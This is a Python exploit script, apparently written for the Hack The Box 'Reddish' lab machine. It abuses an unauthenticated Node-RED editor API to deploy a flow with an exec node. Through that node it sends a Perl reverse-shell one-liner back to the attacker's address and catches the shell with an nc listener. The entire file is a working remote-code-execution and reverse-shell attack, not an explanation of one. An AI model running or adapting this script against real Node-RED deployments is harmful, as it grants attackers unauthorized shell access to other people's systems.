#!/usr/bin/python3

import socket, requests, re, sys, signal, subprocess, os, argparse, netifaces, json, netifaces, shlex
from threading import Thread

burp = {"http" : "http://127.0.0.1:8080"}

def args():
	parser = argparse.ArgumentParser(add_help=False, formatter_class=argparse.RawTextHelpFormatter)
	required = parser.add_argument_group("Required Arguments")
	optional = parser.add_argument_group("Optional Arguments")
	required.add_argument("-t", "--target", help="Ip of reddish machine", required=True, metavar="10.X.X.X")
	required.add_argument("-p", "--port", help="Port where the reverse shell will be received", required=True, metavar="443", type=int)
	required.add_argument("-sp", "--second-port", help="Port to send the reverse shell, this will be in order to send the reverse shell with bash", required=True, metavar="4444", dest="second_port", type=int)
	optional.add_argument("-i", "--interface", help="Your hackthebox interface, by default: tun0", default="tun0", metavar="tun0")
	if len(sys.argv) <= 2:
		parser.print_help()
		sys.exit()
	args = parser.parse_args()
	return args.target, args.port, args.second_port, args.interface

# Get current flows
def getFlows(flows_url):
	# {"flows":[],"rev":"513fd923d68021b8ee98fcb250470340"}
	r = s.get(flows_url)
	return r.text

def tabsCase(active_flows, payload_flow_tabs):
	other_flow_tabs = re.findall(r'(.*"type":"tab","label":"Flow 1"}),{"id":".*?","type":"tcp out"', active_flows)[0] + ","
	other_tabs = re.findall(r'.*"type":"tab","label":"Flow 1"}(,{"id":".*?","type":"tcp.*)', active_flows)[0][:-1] # delete the "]" of other_tabs
	return other_flow_tabs + payload_flow_tabs + other_tabs # In case there are another tabs

# Generate the payload
def genPayload(flow_rev_url, red_url, flows_url, host, second_port):
	active_flows = getFlows(flows_url)
	rev_id = getRevId(flow_rev_url, red_url)

	payload_flow_tabs = '{"id":"7235b2e6.4cdb9c","type":"tab","label":"Flow 1"}'

	if active_flows != "[]":
		content = tabsCase(active_flows, payload_flow_tabs)
	else:
		content = '[{"id":"7235b2e6.4cdb9c","type":"tab","label":"Flow 1"}'
	flow_and_other_tabs = '{"flows":%s' % (content)

	payload_other_tabs = ',{"id":"d03f1ac0.886c28","type":"tcp out","z":"7235b2e6.4cdb9c","host":"","port":"","beserver":"reply","base64":false,"end":false,"name":"","x":786,"y":350,"wires":[]},{"id":"c14a4b00.271d28","type":"tcp in","z":"7235b2e6.4cdb9c","name":"","server":"client","host":"%s","port":"%s","datamode":"stream","datatype":"buffer","newline":"","topic":"","base64":false,"x":281,"y":337,"wires":[["4750d7cd.3c6e88"]]},{"id":"4750d7cd.3c6e88","type":"exec","z":"7235b2e6.4cdb9c","command":"","addpay":true,"append":"","useSpawn":"false","timer":"","oldrc":false,"name":"","x":517,"y":362.5,"wires":[["d03f1ac0.886c28"],["d03f1ac0.886c28"],["d03f1ac0.886c28"]]}],"rev":"%s"}' % (host, second_port, rev_id)

	final_payload = json.loads(flow_and_other_tabs + payload_other_tabs)
	return final_payload

def getRevId(flow_rev_url, red_url):
	header = {
		"Accept" : "application/json",
		"Node-RED-API-Version" : "v2",
		"User-Agent" : "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36",
		"X-Requested-With" : "XMLHttpRequest",
		"Referer" : red_url,
		"Accept-Encoding" : "gzip, deflate",
		"Accept-Language" : "es-419,es;q=0.9,en;q=0.8",
		"Connection" : "close"
	}
	r = s.get(flow_rev_url, headers=header)
	return re.findall(r'"rev":"(.*?)"', r.text)[0]

# Get the id
def getId(base_url):
	global s
	header = {"User-Agent" : "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36"}
	s = requests.session()

	r = requests.post(base_url, headers=header)
	r = requests.post(base_url, headers=header)

	r = s.post(base_url, headers=header)
	return re.findall(r'{"id":"(.*?)"', r.text)[0]

def initUrls(target, id):
	flows_url = f"http://{target}:1880/red/{id}/flows"
	red_url = f"http://{target}:1880/red/{id}/"
	flow_rev_url = f"http://{target}:1880/red/{id}/flows?_=1644590494806"
	return flows_url, red_url, flow_rev_url

def getAddr(interface):
	return netifaces.ifaddresses(interface)[netifaces.AF_INET][0]['addr']

def sendline(command):
	conn.sendall(command.encode())
	response = ""
	while True:
		data = conn.recv(1024).decode()
		response += data
		if not data or response.endswith("[object Object]"): break
	return response

def server(addr, host, port):
	print("[*] Starting socket server")
	global conn, sock
	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
		sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		sock.bind(addr)
		sock.listen()
		print(f"[*] Listening on [{addr[0]}] {addr[1]} ...")
		conn, addr = sock.accept()
		print(f"[*] New connection from [{addr[0]}] [{addr[1]}]")
		reverse_shell_payload = """perl -e 'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'""" % (host, port)
		Thread(target=sendline, args=(reverse_shell_payload,), daemon=True).start()
		subprocess.run(shlex.split(f"nc -lvnp {port}"))

def sendReverseShell(host, port, second_port, flows_url, post_data, base_url, red_url):
	header = {
		"Accept" : "*/*",
		"Node-RED-Deployment-Type" : "full",
		"Node-RED-API-Version" : "v2",
		"X-Requested-With" : "XMLHttpRequest",
		"User-Agent" : "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36",
		"Content-Type" : "application/json; charset=UTF-8",
		"Origin" : base_url,
		"Referer" : red_url,
		"Accept-Encoding": "gzip, deflate",
		"Accept-Language": "es-419,es;q=0.9,en;q=0.8",
	}
	Thread(target=s.post, args=(flows_url,), kwargs=({"json" : post_data, "headers" : header}), daemon=True).start()
	server(("0.0.0.0", second_port), host, port)

# Main Function
def main():
	target, port, second_port, interface, = args()
	host = getAddr(interface)
	base_url = f"http://{target}:1880/"
	id = getId(base_url)
	flows_url, red_url, flow_rev_url = initUrls(target, id)

	post_data = genPayload(flow_rev_url, red_url, flows_url, host, second_port)
	sendReverseShell(host, port, second_port, flows_url, post_data, base_url, red_url)

def sig_handler(signum, frame):
	try:
		sock.close()
		print("\n\n[*] Closing socket...")
	except:
		pass
	print("[*] Exiting...")
	sys.exit()

signal.signal(signal.SIGINT, sig_handler)

if __name__ == '__main__':
	main()
